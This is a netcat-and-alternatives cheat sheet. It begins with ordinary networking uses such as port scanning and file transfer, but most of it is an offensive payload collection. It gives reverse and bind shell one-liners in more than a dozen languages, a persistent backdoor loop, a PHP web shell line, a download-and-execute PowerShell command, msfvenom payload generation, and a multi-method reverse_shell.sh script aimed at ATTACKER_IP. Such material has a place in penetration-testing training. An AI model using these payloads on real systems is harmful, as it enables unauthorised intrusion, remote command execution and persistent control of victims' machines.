# NETCAT & ALTERNATIVES COMPLETE CHEAT SHEET

## 1. WHAT IS NETCAT?

**Netcat (nc)** is the "Swiss Army knife" of TCP/IP networking. It reads and writes data across network connections using TCP or UDP. It is used for:

- **Port scanning**
- **File transfers**
- **Reverse / Bind shells**
- **Port forwarding / relays**
- **Banner grabbing**
- **Simple HTTP servers**
- **Debugging network services**
- **Honeypots and backdoors**

**Key fact:** Multiple implementations exist (Traditional, OpenBSD, Ncat, Socat, Cryptcat) with different option support. Always check `nc -h` to know what you have.

---

## 2. BASIC SYNTAX

```bash
nc [options] [host] [port]
nc -l [options] [port]           # Listen mode (server)
```

---

## 3. MAIN OPTIONS

```bash
-l                    # Listen mode
-L                    # Persistent listen (Windows)
-p [port]             # Local port
-u                    # UDP instead of TCP
-v                    # Verbose
-vv                   # More verbose
-n                    # No DNS resolution
-w [seconds]          # Connection timeout
-z                    # Zero I/O mode (port scan)
-e [command]          # Execute command (bind shell)
-c [command]          # Execute command with shell
-k                    # Keep listening after disconnect
-q [seconds]          # Wait X seconds before closing
-s [IP]               # Source IP
-4                    # Force IPv4
-6                    # Force IPv6
```

---

## 4. PORT SCANNING

```bash
nc -zv 192.168.1.1 80
nc -zv 192.168.1.1 20-100
nc -zv 192.168.1.1 1-1000
nc -znv 192.168.1.1 20-80
nc -zuv 192.168.1.1 53
nc -zuv 192.168.1.1 161
nc -zvw3 192.168.1.1 1-100
nc -zv target.com 21-25,80,443,3389,8080
nc -zv target.com 20-1000 2>&1 | grep succeeded
```

---

## 5. FILE TRANSFER

### 5.1 Send File
```bash
# Receiver (listens)
nc -l -p 1234 > received_file.txt
nc -lvp 4444 > file.zip

# Sender
nc 192.168.1.10 1234 < file_to_send.txt
nc -w3 192.168.1.10 4444 < file.zip
```

### 5.2 Send Directory (with tar)
```bash
# Receiver
nc -l -p 1234 | tar xvf -
nc -lvp 5555 | tar xzvf -

# Sender
tar cvf - /path/directory | nc 192.168.1.10 1234
tar czvf - /home/user/data | nc 192.168.1.10 5555
```

### 5.3 With Compression
```bash
# Receiver
nc -l -p 9999 | gunzip > file.tar

# Sender
gzip -c file.tar | nc 192.168.1.10 9999
```

### 5.4 With Progress (pv)
```bash
pv file.bin | nc 10.0.0.5 1234
```

---

## 6. SIMPLE CHAT

```bash
# Machine 1 (server)
nc -l -p 5000
nc -lvp 5000

# Machine 2 (client)
nc 192.168.1.10 5000
```

Press Enter to send, Ctrl+C to exit.

---

## 7. BANNER GRABBING

```bash
nc -v 192.168.1.1 80
nc -v 192.168.1.1 25
nc -v 192.168.1.1 22
nc -v 192.168.1.1 21
echo "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.1 80
echo "QUIT" | nc 192.168.1.1 25
echo "" | nc -nv -w 2 target.com 22 80 443 21 25
```

### HTTP Request via nc
```bash
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
printf "GET / HTTP/1.0\r\n\r\n" | nc target.com 80
```

### SMTP via nc
```bash
nc -C target.com 25
# HELO test
# MAIL FROM: <test@test.com>
# RCPT TO: <dest@dest.com>
# DATA
# Test message
# .
# QUIT
```

---

## 8. REVERSE SHELL

### Attacker Listens
```bash
nc -lvp 4444
nc -lvnp 4444
```

### Victim Connects (Linux)
```bash
nc 192.168.1.100 4444 -e /bin/bash
nc 192.168.1.100 4444 -e /bin/sh
```

### Victim Connects (Windows)
```bash
nc 192.168.1.100 4444 -e cmd.exe
nc.exe 192.168.1.100 4444 -e cmd.exe
```

### If nc has no -e (OpenBSD nc)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
mknod backpipe p; nc 192.168.1.100 4444 0<backpipe | /bin/bash 1>backpipe
```

---

## 9. BIND SHELL

### Victim Listens
```bash
nc -lvp 4444 -e /bin/bash              # Linux
nc -lvp 4444 -e cmd.exe                # Windows
nc -klvp 4444 -e /bin/bash             # Persistent
```

### Attacker Connects
```bash
nc 192.168.1.50 4444
```

---

## 10. PROXY / RELAY

```bash
nc -l -p 8080 -c "nc google.com 80"
nc -l -p 4000 | nc hostB 80

# Bidirectional relay with mknod
mknod backpipe p
nc -l -p 8080 0<backpipe | nc google.com 80 1>backpipe
```

---

## 11. SIMPLE WEB SERVER

```bash
# Serve HTML once
while true; do nc -l -p 8080 < index.html; done

# With full HTTP response
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat index.html; } | nc -l -p 8080

# Persistent server
while true; do { echo -e "HTTP/1.1 200 OK\r\n"; cat index.html; } | nc -l -p 8080; done
```

---

## 12. PERSISTENT BACKDOOR

```bash
# Linux with auto-restart
while true; do nc -l -p 4444 -e /bin/bash; done

# With script
#!/bin/bash
while true; do
    nc -lvp 4444 -e /bin/bash
    sleep 1
done

# Windows
nc -L -p 4444 -e cmd.exe
```

---

## 13. DISK / PARTITION CLONING

```bash
# Receiver
nc -l -p 9999 | dd of=/dev/sdb

# Sender
dd if=/dev/sda | nc 192.168.1.10 9999
```

---

## 14. CONNECTIVITY TESTING

```bash
nc -zv 192.168.1.1 22
nc -uv 8.8.8.8 53

# Bandwidth test
# Receiver
nc -l -p 5555 > /dev/null

# Sender
dd if=/dev/zero bs=1M count=100 | nc 192.168.1.10 5555
```

---

## 15. SIMPLE HONEYPOT

```bash
nc -lvp 23 > /var/log/honeypot.log

# With timestamp
while true; do
    echo "Connection at $(date)" >> /var/log/honeypot.log
    nc -lvp 23 >> /var/log/honeypot.log
done
```

---

## 16. PAYLOAD DELIVERY

```bash
# Receiver executes
nc -lvp 4444 | /bin/bash
nc -lvp 4444 | python3

# Sender
cat script.sh | nc 192.168.1.10 4444
cat script.py | nc 192.168.1.10 4444
```

---

## 17. SAVE OUTPUT / LOGS

```bash
nc -l -p 3333 > capture.log
nc host 4444 | tee output.txt
```

---

## 18. UDP TUNNEL

```bash
# Receiver
nc -lup 5555

# Sender
nc -u 192.168.1.10 5555
```

---

## 19. PORT FORWARDING

```bash
nc -l -p 8080 -c "nc 192.168.1.100 80"
nc -lvp 8080 -c "nc 192.168.1.100 3389"

# With mknod
mkfifo /tmp/fifo
nc -l -p 8080 < /tmp/fifo | nc 192.168.1.100 80 > /tmp/fifo
```

---

## 20. NETCAT VARIANTS

- **Netcat Traditional** (`nc`) – includes `-e` in some distros
- **Netcat OpenBSD** (`nc`) – no `-e` by default
- **Ncat (Nmap project)** – more secure, supports SSL
- **Socat** – more advanced
- **Cryptcat** – netcat with encryption

```bash
# Install ncat
sudo apt install ncat

# Use ncat with SSL
ncat --ssl -lvp 4444
ncat --ssl 192.168.1.10 4444
```

---

## 21. ALTERNATIVES TO NETCAT -e

### 21.1 Named Pipes (FIFO) — Most Common

**Reverse shell:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```

**Bind shell:**
```bash
rm /tmp/f; mkfifo /tmp/f; nc -lvp 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1
```

**Explanation:**
- `mkfifo` creates a named pipe (FIFO)
- `cat` reads from the pipe
- `sh`/`bash` processes commands
- `nc` sends/receives data
- `> /tmp/f` redirects output to the pipe
- `2>&1` redirects stderr to stdout

### 21.2 mknod (Alternative to mkfifo)

**Reverse shell:**
```bash
mknod /tmp/backpipe p
/bin/bash 0</tmp/backpipe | nc 192.168.1.100 4444 1>/tmp/backpipe
```

**Bind shell:**
```bash
mknod /tmp/backpipe p
nc -lvp 4444 0<backpipe | /bin/bash 1>backpipe 2>&1
```

**Short version:**
```bash
mknod backpipe p; nc 192.168.1.100 4444 0<backpipe | /bin/bash 1>backpipe
```

### 21.3 /dev/tcp (Bash Builtin) — No Netcat

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
0<&196;exec 196<>/dev/tcp/192.168.1.100/4444; sh <&196 >&196 2>&196
```

### 21.4 Telnet (as Netcat Substitute)

```bash
rm -f /tmp/p; mknod /tmp/p p; telnet 192.168.1.100 4444 0</tmp/p | /bin/bash 1>/tmp/p
telnet 192.168.1.100 4444 | /bin/bash | telnet 192.168.1.100 5555
```

### 21.5 Socat (Best Alternative)

**Reverse shell:**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444
socat TCP:192.168.1.100:4444 EXEC:/bin/bash
```

**Bind shell:**
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
socat TCP-LISTEN:4444 EXEC:/bin/bash
```

**Attacker listens with socat:**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**With SSL encryption:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listen (attacker)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT

# Connect (victim)
socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash
```

### 21.6 Perl

```bash
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.100:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 21.7 Python

**Python 2:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Python 3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**With PTY for full TTY:**
```bash
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### 21.8 PHP

```bash
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.100",4444);shell_exec("/bin/bash -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.1.100",4444);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

**From a webserver:**
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'"); ?>
```

### 21.9 Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("192.168.1.100",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.100","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### 21.10 AWK

```bash
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.100/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### 21.11 Ncat (Nmap Netcat) — Has -e Enabled

```bash
ncat -e /bin/bash 192.168.1.100 4444
ncat -lvp 4444 -e /bin/bash
ncat --ssl -e /bin/bash 192.168.1.100 4444
```

### 21.12 Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.100:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### 21.13 Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.1.100','4444');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

### 21.14 Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 21.15 PowerShell (Windows)

**Basic reverse shell:**
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Powercat:**
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -c 192.168.1.100 -p 4444 -e cmd
```

### 21.16 Xterm (if X11 is available)

```bash
# Attacker
xhost +
nc -lvp 6001

# Victim
xterm -display 192.168.1.100:1
DISPLAY=192.168.1.100:0 xterm
```

---

## 22. UPGRADE TO FULL TTY (AFTER GETTING SHELL)

### Step 1: Spawn PTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
script -qc /bin/bash /dev/null
```

### Step 2: Background Shell (Ctrl+Z)
```
Ctrl + Z
```

### Step 3: Configure Local Terminal
```bash
stty raw -echo; fg
```

### Step 4: Reset and Configure
```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
stty -a
```

---

## 23. RECOMMENDED ATTACKER LISTENERS

```bash
# Traditional netcat
nc -lvnp 4444

# Ncat
ncat -lvnp 4444

# Socat (with TTY)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Pwncat (recommended)
pip install pwncat-cs
pwncat-cs -lp 4444

# Metasploit
use exploit/multi/handler
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

---

## 24. PAYLOAD GENERATORS

```bash
# msfvenom
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw

# Online generators
# https://www.revshells.com/
# https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

---

## 25. DETECTING SYSTEM CAPABILITIES

```bash
which nc ncat socat telnet perl python python3 php ruby awk lua java go
whereis nc ncat socat python perl
find / -name nc 2>/dev/null
find / -name socat 2>/dev/null

# Check if nc has -e
nc -h 2>&1 | grep -e "-e"
man nc | grep -A 5 "\-e"
nc -h 2>&1 | grep "exec"
```

---

## 26. SCRIPT: CAPABILITY CHECK

```bash
#!/bin/bash
# check_capabilities.sh

echo "=== Checking reverse shell capabilities ==="

if [ -e /dev/tcp ]; then
    echo "✓ Bash /dev/tcp available"
else
    echo "✗ Bash /dev/tcp not available"
fi

if command -v python &> /dev/null; then
    echo "✓ Python available"
else
    echo "✗ Python not available"
fi

if command -v perl &> /dev/null; then
    echo "✓ Perl available"
else
    echo "✗ Perl not available"
fi

if command -v nc &> /dev/null; then
    echo "✓ Netcat available"
    nc -h 2>&1 | grep -q "\-e" && echo "  ✓ -e parameter available" || echo "  ✗ -e parameter NOT available"
else
    echo "✗ Netcat not available"
fi

if command -v ncat &> /dev/null; then
    echo "✓ Ncat available"
fi

if command -v socat &> /dev/null; then
    echo "✓ Socat available"
fi
```

---

## 27. SCRIPT: MULTI-METHOD REVERSE SHELL

```bash
#!/bin/bash
# reverse_shell.sh
ATTACKER_IP="10.0.0.5"
PORT="4444"

echo "Trying reverse connection to $ATTACKER_IP:$PORT"

# Method 1: Bash /dev/tcp
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1" 2>/dev/null &

# Method 2: Python
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ATTACKER_IP',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>/dev/null &

# Method 3: Netcat with pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACKER_IP $PORT > /tmp/f &

echo "Methods executed. Check your listener."
```

---

## 28. TROUBLESHOOTING

```bash
# Firewall
sudo ufw status
sudo iptables -L

# Port in use
netstat -tuln | grep 4444
ss -tuln | grep 4444

# Permissions (< 1024 needs root)
sudo nc -lvp 80

# Version
nc -h
which nc

# SELinux
getenforce
setenforce 0
```

---

## 29. SECURITY AND BEST PRACTICES

- **NEVER** leave nc listening in production without protection.
- Use a firewall to restrict access.
- Prefer ncat with SSL for sensitive communications.
- Do not transmit passwords in plaintext.
- Log all connections.
- Restrict allowed IPs with iptables/firewall.

```bash
iptables -A INPUT -p tcp --dport 4444 -s 192.168.1.100 -j ACCEPT
iptables -A INPUT -p tcp --dport 4444 -j DROP
```

---

## 30. RECOMMENDATIONS SUMMARY

1. **MKFIFO** is the most universal and reliable method.
2. **SOCAT** is the best tool if available.
3. **/dev/tcp** works in bash, not sh.
4. **Python/Perl/PHP** are usually available.
5. Always check what interpreters the system has.
6. Upgrade to full TTY for better usability.
7. **NCAT** (Nmap version) has `-e` by default.
